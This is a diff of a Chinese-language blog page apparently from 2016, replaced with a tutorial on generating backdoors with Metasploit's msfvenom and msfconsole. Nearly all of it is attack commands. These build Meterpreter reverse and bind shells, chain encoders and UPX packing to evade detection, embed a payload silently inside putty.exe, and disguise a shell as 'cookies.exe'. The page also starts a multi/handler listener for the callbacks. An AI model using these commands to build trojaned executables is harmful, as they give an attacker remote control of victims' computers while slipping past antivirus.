@@ -1,1 +1,94 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="baidu-site-verification" content="gDf3P6sfyW" /><meta name="360-site-verification" content="0c91ee58977e5924d92896a89289b668" /><meta name="sogou_site_verification" content="jHNtHqKt34"/><meta name="google-site-verification" content="An2eGWQakKFcIZ1YuwZSilNuSYlfHs1zH0Hr-OMW6oQ" /><title>metasploit运行时生成后门，非旧版的msfpayload，非新版msfvnom</title><meta name="description" content=""><meta name="keywords" content="kali,metasploit,后门生成"><link rel="icon" href="/assets/favicon.ico"><link rel="apple-touch-icon" href="/assets/touch-icon.png"><link rel="stylesheet" href="/assets/core.css"><link rel="canonical" href="/2016/04/metasploit-generate-backdoor/"><link rel="alternate" type="application/atom+xml" title="Vinny's Blog - 王俊博客 - 交流软件领域知识 | 纪录点滴精彩人生" href="/feed.xml" /></head><body><nav class="header-nav"> <a class="page-link" href="/">HOME</a> / <a class="page-link" href="/categories/">CATEGORY</a> / <a class="page-link" href="/feed.xml">FEED</a> / <a class="page-link" href="/about/">ABOUT</a></nav><main> <noscript><style> article .footnotes { display: block; }</style></noscript><article><div class="center"><h1>metasploit运行时生成后门，非旧版的msfpayload，非新版msfvnom</h1><time>2016-04-30</time></div><div class="divider"></div><div class="divider"></div><blockquote id='by-nc-nd'><div> 版权所有，本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">知识共享署名-非商业性使用 3.0 未本地化版本许可协议</a>进行许可。转载请注明出处：<a href="http://localhost:4000//2016/04/metasploit-generate-backdoor/" akt="">http://localhost:4000//2016/04/metasploit-generate-backdoor/</a></div></blockquote><div class="divider"></div><a class="w-toplink active" href="#" title="Back to top">^</a> <!-- 多说评论框 start --><div class="ds-thread" data-thread-key="29bca95032aff645a6f67f03e45bddfb" data-title="metasploit运行时生成后门，非旧版的msfpayload，非新版msfvnom" data-url="/2016/04/metasploit-generate-backdoor/"></div><!-- 多说评论框 end --></article><div class="page-navigation"> <a class="next" href="/2016/05/theharvester-get-email/" title="NEXT: 通过搜索引擎批量获取email地址信息">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="/" title="Back to Homepage">首页</a> <span> &middot; </span> <a class="prev" href="/2016/04/linux-exfat-error/" title="PREV: linux系统上挂载exFAT文件设备，解决unknown filesystem type 'exfat'错误">&gt;&gt;</a></div><!-- 多说公共JS代码 start (一个网页只需插入一次) --> <script type="text/javascript"> var duoshuoQuery = {short_name:"wangjunneil"}; (function() { var ds = document.createElement('script'); ds.type = 'text/javascript';ds.async = true; ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js'; ds.charset = 'UTF-8'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds); })(); </script> <!-- 多说公共JS代码 end --></main><div class="footer"> <!-- <span class="block">Made with &hearts; using <a href="http://jekyllrb.com/">Jekyll</a> &amp; <a href="https://github.com/heiswayi/the-plain" title="The Plain theme by Heiswayi Nrird">The Plain</a> &middot; &lt;/&gt; on <a href="https://github.com/wangjunneil" title="Hosted on GitHub">GitHub</a></span> --> <span class="block"><a href="https://vinny.cc">Vinny's Blog</a> © 2017 - All Rights Reserved</span></div><script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?9c10955e76f3568532fff91d922d32ac"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> (function(){ var bp = document.createElement('script'); var curProtocol = window.location.protocol.split(':')[0]; if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; } else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; } var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s); })(); </script> <script> (function(){ var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?fa28985f7104be1c3ead0ecbe074eb24":"https://jspassport.ssl.qhimg.com/11.0.1.js?fa28985f7104be1c3ead0ecbe074eb24"; document.write('<script src="' + src + '" id="sozz"><\/script>'); })(); </script> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-88762290-1', 'auto'); ga('send', 'pageview'); </script></body></html>
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="baidu-site-verification" content="gDf3P6sfyW" /><meta name="360-site-verification" content="0c91ee58977e5924d92896a89289b668" /><meta name="sogou_site_verification" content="jHNtHqKt34"/><meta name="google-site-verification" content="An2eGWQakKFcIZ1YuwZSilNuSYlfHs1zH0Hr-OMW6oQ" /><title>Metasploit后门生成</title><meta name="description" content=""><meta name="keywords" content="kali,metasploit,后门生成,msfvenom"><link rel="icon" href="/assets/favicon.ico"><link rel="apple-touch-icon" href="/assets/touch-icon.png"><link rel="stylesheet" href="/assets/core.css"><link rel="canonical" href="/2016/04/metasploit-generate-backdoor/"><link rel="alternate" type="application/atom+xml" title="Vinny's Blog - 王俊博客 - 交流软件领域知识 | 纪录点滴精彩人生" href="/feed.xml" /></head><body><nav class="header-nav"> <a class="page-link" href="/">HOME</a> / <a class="page-link" href="/categories/">CATEGORY</a> / <a class="page-link" href="/feed.xml">FEED</a> / <a class="page-link" href="/about/">ABOUT</a></nav><main> <noscript><style> article .footnotes { display: block; }</style></noscript><article><div class="center"><h1>Metasploit后门生成</h1><time>2016-04-30</time></div><div class="divider"></div><ul id="markdown-toc"><li><a href="#metasploit后门生成" id="markdown-toc-metasploit后门生成">Metasploit后门生成</a><ul><li><a href="#帮助说明" id="markdown-toc-帮助说明">帮助说明</a></li><li><a href="#基本使用" id="markdown-toc-基本使用">基本使用</a></li><li><a href="#win32-shellcode追加-c" id="markdown-toc-win32-shellcode追加-c">Win32 shellcode追加-c</a></li><li><a href="#msfconsole控制台生成" id="markdown-toc-msfconsole控制台生成">msfconsole控制台生成</a></li></ul></li></ul><hr /><h1 id="metasploit后门生成">Metasploit后门生成</h1><h2 id="帮助说明">帮助说明</h2><div class="highlighter-rouge"><pre class="highlight"><code>root@kalibook:~# msfvenom -h
+Error: MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;
+
+Options:
+    -p, --payload       &lt;payload&gt;    需要使用的攻击载荷，若需要自定义payload则使用-或者stdin指定
+        --payload-options            列出所有攻击载荷的标准选项
+    -l, --list          [type]       列出所有模块类型，可用的模块有payloads, encoders, nops, all
+    -n, --nopsled       &lt;length&gt;     在payload上指定NOPs的滑动长度
+    -f, --format        &lt;format&gt;     输出载荷的格式，可以使用--help-formats列出所有可用格式
+        --help-formats               列出所有可用格式
+    -e, --encoder       &lt;encoder&gt;    指定使用哪种编码器
+    -a, --arch          &lt;arch&gt;       指定payload的目标架构
+        --platform      &lt;platform&gt;   指定payload的目标平台
+        --help-platforms             列出所有可用的平台列表
+    -s, --space         &lt;length&gt;     设定payload的最大长度
+    -b, --bad-chars     &lt;list&gt;       设定规避字符集，如：'\x00\xff'
+    -i, --iterations    &lt;count&gt;      设定payload的编码次数
+    -c, --add-code      &lt;path&gt;       指定一个附加的win32 shellcode文件
+    -x, --template      &lt;path&gt;       指定一个自定义的可执行程序作为模板
+    -k, --keep                       保护模板程序的动作（正常运行）且注入payload做为一个新的线程运行
+    -o, --out           &lt;path&gt;       指定输出位置
+    -v, --var-name      &lt;name&gt;       自定义变量以确定输出格式
+        --smallest                   尽可能小的生成payload
+
+</code></pre></div><h2 id="基本使用">基本使用</h2><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># -p 指定payload</span>
+<span class="c"># -f 指定输出格式</span>
+<span class="c"># -o 指定输出位置</span>
+<span class="c"># lhost payload参数，指定反向连接服务端地址</span>
+<span class="c"># lport payload参数，指定反向连接服务端端口</span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.1.137 <span class="nv">lport</span><span class="o">=</span>4444 -f exe -o a.exe
+
+<span class="c"># 结合编码器生成后门</span>
+<span class="c">#  -e 指定编码器</span>
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f exe -o a.exe
+
+<span class="c"># 对编码器多次编码</span>
+<span class="c">#  -i &lt;num&gt; 编码次数</span>
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3  -f exe -o a.exe
+
+<span class="c"># 规避字符集</span>
+<span class="c">#  -b 设定规避字符集</span>
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -b <span class="s1">'\x00'</span> -f exe -o a.exe
+
+<span class="c"># 使用自定义程序模板，默认使用的是msf/data/templates下的模板</span>
+<span class="c">#  -x 模板程序</span>
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -x /root/temporary/putty.exe -f exe &gt; a.exe
+
+<span class="c"># 使用自定义程序模板，隐秘的启动攻击载荷</span>
+<span class="c"># -k 配置攻击载荷在独立的线程中启动，不影响宿主程序的运行</span>
+msfvenom -p windows/meterpreter/bind_tcp -x /root/temporary/putty.exe -k -f exe &gt; a.exe
+
+<span class="c">#  编码链，结合多种编码器对payload进行编码</span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.1.137 <span class="nv">LPORT</span><span class="o">=</span>4444 -f raw -e x86/shikata_ga_nai -i 5 | <span class="se">\</span>
+msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | <span class="se">\</span>
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+
+<span class="c"># 加壳</span>
+upx -5 /root/Desktop/payload.exe
+
+<span class="c"># 查看所有linux可用的payload</span>
+msfvenom -l payloads | grep linux
+
+<span class="c"># 查看所有windows可用的payload</span>
+msfvenom -l payloads | grep windows
+
+<span class="c"># 查看所有支持的输出格式</span>
+msfvenom --help-formats
+
+<span class="c"># 查看所有可用的编码器</span>
+msfvenom -l encoders
+</code></pre></div><h2 id="win32-shellcode追加-c">Win32 shellcode追加-c</h2><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 生成一个弹出消息的payload，消息的内容是How are you?，TEXT是payload的参数</span>
+msfvenom -a x86 --platform windows -p windows/messagebox <span class="nv">TEXT</span><span class="o">=</span><span class="s2">"How are you?"</span> -f raw &gt; messageBox
+
+<span class="c"># 生成一个弹出消息的payload，消息的内容是Fine, thank you。并且使用-c追加上面生成的shellcode</span>
+msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox <span class="nv">TEXT</span><span class="o">=</span><span class="s2">"Fine, thank you"</span> -f raw &gt; messageBox2
+
+<span class="c"># 生产后门shell的payload，使用上面生成的shellcode</span>
+msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+
+<span class="c"># 运行的结果是：弹出两次提示信息，后台执行反向shell</span>
+</code></pre></div><h2 id="msfconsole控制台生成">msfconsole控制台生成</h2><div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/handler # 启动反向服务端
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp # 设置payload
+msf exploit(handler) &gt; set LHOST 192.168.155.146 # 设置服务端IP
+msf exploit(handler) &gt; set LPORT 4444 # 设置服务端端口
+msf exploit(handler) &gt; exploit -j # 调入后台执行服务端
+
+msf exploit(handler) &gt; use payload/windows/meterpreter/reverse_tcp # 设置客户端payload
+msf payload(reverse_tcp) &gt; set LHOST 192.168.155.146 # 设置后门程序客户端连接的服务端IP
+msf payload(reverse_tcp) &gt; set LPORT 4444 # 设置后门程序客户端连接的服务端端口
+msf payload(reverse_tcp) &gt; generate -t exe -p windows -f /root/backdoor.exe # 生成客户端后门程序
+msf payload(reverse_tcp) &gt; jobs # 查看下反向服务端接受任务是否已经在后台执行
+</code></pre></div><div class="divider"></div><blockquote id='by-nc-nd'><div> 版权所有，本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">知识共享署名-非商业性使用 3.0 未本地化版本许可协议</a>进行许可。转载请注明出处：<a href="http://localhost:4000//2016/04/metasploit-generate-backdoor/" akt="">http://localhost:4000//2016/04/metasploit-generate-backdoor/</a></div></blockquote><div class="divider"></div><a class="w-toplink active" href="#" title="Back to top">^</a> <!-- 多说评论框 start --><div class="ds-thread" data-thread-key="29bca95032aff645a6f67f03e45bddfb" data-title="Metasploit后门生成" data-url="/2016/04/metasploit-generate-backdoor/"></div><!-- 多说评论框 end --></article><div class="page-navigation"> <a class="next" href="/2016/05/theharvester-get-email/" title="NEXT: 通过搜索引擎批量获取email地址信息">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="/" title="Back to Homepage">首页</a> <span> &middot; </span> <a class="prev" href="/2016/04/linux-exfat-error/" title="PREV: linux系统上挂载exFAT文件设备，解决unknown filesystem type 'exfat'错误">&gt;&gt;</a></div><!-- 多说公共JS代码 start (一个网页只需插入一次) --> <script type="text/javascript"> var duoshuoQuery = {short_name:"wangjunneil"}; (function() { var ds = document.createElement('script'); ds.type = 'text/javascript';ds.async = true; ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js'; ds.charset = 'UTF-8'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds); })(); </script> <!-- 多说公共JS代码 end --></main><div class="footer"> <!-- <span class="block">Made with &hearts; using <a href="http://jekyllrb.com/">Jekyll</a> &amp; <a href="https://github.com/heiswayi/the-plain" title="The Plain theme by Heiswayi Nrird">The Plain</a> &middot; &lt;/&gt; on <a href="https://github.com/wangjunneil" title="Hosted on GitHub">GitHub</a></span> --> <span class="block"><a href="https://vinny.cc">Vinny's Blog</a> © 2017 - All Rights Reserved</span></div><script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?9c10955e76f3568532fff91d922d32ac"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> (function(){ var bp = document.createElement('script'); var curProtocol = window.location.protocol.split(':')[0]; if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; } else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; } var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s); })(); </script> <script> (function(){ var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?fa28985f7104be1c3ead0ecbe074eb24":"https://jspassport.ssl.qhimg.com/11.0.1.js?fa28985f7104be1c3ead0ecbe074eb24"; document.write('<script src="' + src + '" id="sozz"><\/script>'); })(); </script> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-88762290-1', 'auto'); ga('send', 'pageview'); </script></body></html>
